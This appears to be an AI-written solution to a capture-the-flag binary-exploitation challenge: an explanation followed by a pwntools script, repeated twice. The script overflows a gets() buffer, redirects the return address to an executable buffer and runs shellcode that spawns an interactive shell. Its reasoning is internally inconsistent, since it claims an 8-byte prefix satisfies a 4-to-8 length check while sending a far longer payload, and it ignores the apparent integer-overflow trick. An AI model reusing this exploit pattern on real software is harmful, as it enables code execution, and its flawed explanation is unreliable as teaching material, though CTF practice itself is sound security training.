("To solve this challenge using pwntools, we'll exploit a buffer overflow "
 'vulnerability in the `validate_passwd` function. The program reads user '
 'input into a fixed-size buffer `s[50]` using `gets()`, which does not check '
 'for buffer overflows. We can overflow this buffer to overwrite the saved '
 'return address on the stack. Additionally, the `check` function copies our '
 'input into `passwd_buf` and sets its memory page to be executable using '
 '`mprotect`. Our exploit plan is:\n'
 '\n'
 '1. Provide an input length between 4 and 8 to pass the length check in '
 '`check` function.\n'
 '2. Overflow the buffer `s` to overwrite the saved return address with the '
 'address of `passwd_buf`.\n'
 '3. Include shellcode in `passwd_buf` that will execute when the overwritten '
 'return address is used.\n'
 '\n'
 'By doing this, when the function returns, it will jump to our shellcode in '
 '`passwd_buf`, giving us control over the execution flow.\n'
 '\n'
 '**Imports:**\n'
 '\n'
 '```python\n'
 'from pwn import *\n'
 '```\n'
 '\n'
 '**Functioning code block:**\n'
 '\n'
 '```python\n'
 'from pwn import *\n'
 '\n'
 '# Set up pwntools for the correct architecture\n'
 "context.update(arch='i386', os='linux')\n"
 '\n'
 '# Load the binary\n'
 "elf = ELF('./pwn/integer/int-2/int2')\n"
 '\n'
 '# Start the process\n'
 "p = process('./pwn/integer/int-2/int2')\n"
 '\n'
 '# Find the address of passwd_buf\n'
 "passwd_buf = elf.symbols['passwd_buf']\n"
 'print(f"passwd_buf address: {hex(passwd_buf)}")\n'
 '\n'
 '# Generate shellcode to spawn a shell\n'
 'shellcode = asm(shellcraft.sh())\n'
 '\n'
 '# Send the initial prompts\n'
 "p.recvuntil('Plz input your passwd:\\n')\n"
 '\n'
 "# We'll use a cyclic pattern to find the exact offset to EIP\n"
 'payload = cyclic(100)\n'
 '\n'
 '# Send the payload\n'
 'p.sendline(payload)\n'
 '\n'
 '# Wait for the process to crash\n'
 'p.wait()\n'
 '\n'
 '# Open the core dump\n'
 "core = Coredump('./core')\n"
 '\n'
 '# Find the offset to EIP\n'
 'eip_offset = cyclic_find(core.eip)\n'
 'print(f"EIP offset is at {eip_offset} bytes")\n'
 '\n'
 '# Now construct the real payload\n'
 '# We need to have input length between 4 and 8 to pass the length check\n'
 'prefix_length = 8  # Maximum length to pass the check\n'
 "prefix = b'A' * prefix_length\n"
 '\n'
 '# Calculate padding to reach EIP overwrite\n'
 'padding_length = eip_offset - prefix_length\n'
 "padding = b'B' * padding_length\n"
 '\n'
 '# Overwrite EIP with the address of passwd_buf\n'
 'ret_address = p32(passwd_buf)\n'
 '\n'
 '# Final payload\n'
 'payload = prefix + padding + ret_address + shellcode\n'
 '\n'
 '# Restart the process\n'
 "p = process('./pwn/integer/int-2/int2')\n"
 "p.recvuntil('Plz input your passwd:\\n')\n"
 'p.sendline(payload)\n'
 '\n'
 '# Give us an interactive shell\n'
 'p.interactive()\n'
 '```\n'
 '\n'
 '**Explanation:**\n'
 '\n'
 '- **Find `passwd_buf` Address:** We extract the address of `passwd_buf` from '
 'the ELF file, as this is where our shellcode will reside.\n'
 "- **Generate Shellcode:** We use pwntools' `shellcraft` to generate "
 'shellcode that spawns a shell.\n'
 '- **Find EIP Offset:** We send a cyclic pattern to crash the program and '
 'analyze the core dump to find the offset where the saved return address '
 '(EIP) is overwritten.\n'
 '- **Construct Payload:**\n'
 '  - **Prefix:** Ensure the input length is between 4 and 8 to pass the '
 'length check (`prefix_length = 8`).\n'
 '  - **Padding:** Fill the space between the prefix and the saved return '
 'address.\n'
 '  - **Ret Address:** Overwrite the saved return address with the address of '
 '`passwd_buf`.\n'
 '  - **Shellcode:** Append the shellcode to the payload.\n'
 '- **Execute Exploit:** Restart the process, send the crafted payload, and '
 'invoke an interactive shell to interact with the spawned shell.\n'
 '\n'
 '**Note:** Adjust the paths and filenames according to your environment. '
 'Ensure that core dumps are enabled (`ulimit -c unlimited`) to generate the '
 'core file needed for finding the EIP offset.')

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386', os='linux')

# Load the binary
binary_path = './pwn/integer/int-2/int2'
elf = ELF(binary_path)

# Start the process
p = process(binary_path)

# Find the address of passwd_buf
passwd_buf = elf.symbols['passwd_buf']
log.info(f"passwd_buf address: {hex(passwd_buf)}")

# Generate shellcode to spawn a shell
shellcode = asm(shellcraft.sh())

# Send the initial prompts
p.recvuntil(b'Plz input your passwd:\n')

# We'll use a cyclic pattern to find the exact offset to EIP
payload = cyclic(100)

# Send the payload
p.sendline(payload)

# Wait for the process to crash
p.wait()

# Open the core dump
core = Coredump('./core')

# Find the offset to EIP
eip_offset = cyclic_find(core.eip)
log.info(f"EIP offset is at {eip_offset} bytes")

# Now construct the real payload
# We need to have input length between 4 and 8 to pass the length check
prefix_length = 8  # Maximum length to pass the check
prefix = b'A' * prefix_length

# Calculate padding to reach EIP overwrite
padding_length = eip_offset - prefix_length
padding = b'B' * padding_length

# Overwrite EIP with the address of passwd_buf
ret_address = p32(passwd_buf)

# Final payload
payload = prefix + padding + ret_address + shellcode

# Restart the process
p = process(binary_path)
p.recvuntil(b'Plz input your passwd:\n')
p.sendline(payload)

# Give us an interactive shell
p.interactive()